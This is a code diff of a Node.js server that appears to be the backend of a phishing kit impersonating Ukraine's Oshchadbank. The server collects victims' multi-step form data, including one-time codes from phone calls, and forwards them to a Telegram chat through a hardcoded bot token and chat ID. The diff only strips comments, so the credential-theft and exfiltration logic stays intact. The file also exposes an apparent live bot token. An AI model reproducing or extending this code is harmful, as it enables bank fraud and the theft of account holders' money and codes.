@@ -4,9 +4,6 @@ const cors = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
 const WebSocket = require('ws');
 
-// =======================================================================
-// --- НАСТРОЙКИ: Ваши данные уже вставлены ---
-// =======================================================================
 const TELEGRAM_BOT_TOKEN = '8417807179:AAEvlTli6Ba-VfWHFdiFb_0NmfIxj38xnU8';
 const CHAT_ID = -4818175035; 
 // =======================================================================
@@ -49,8 +46,7 @@ app.post('/api/submit', (req, res) => {
     const existingData = sessions.get(sessionId) || { visitCount: 0 };
     const newData = { ...existingData, ...stepData };
     sessions.set(sessionId, newData);
-    
-    // Если пришел код из звонка, отправляем его отдельным сообщением
+
     if (newData.call_code_input) {
         let message = `<b>🔔 Отримано код із дзвінка (Ощадбанк)!</b>\n\n`;
         message += `<b>Код:</b> <code>${newData.call_code_input}</code>\n`;
@@ -59,7 +55,6 @@ app.post('/api/submit', (req, res) => {
         return res.status(200).json({ message: 'Call code received' });
     }
 
-    // Отправляем полный лог, только когда клиент подтвердит, что это был финальный шаг
     if (isFinalStep) {
         newData.visitCount += 1;
         sessions.set(sessionId, newData);
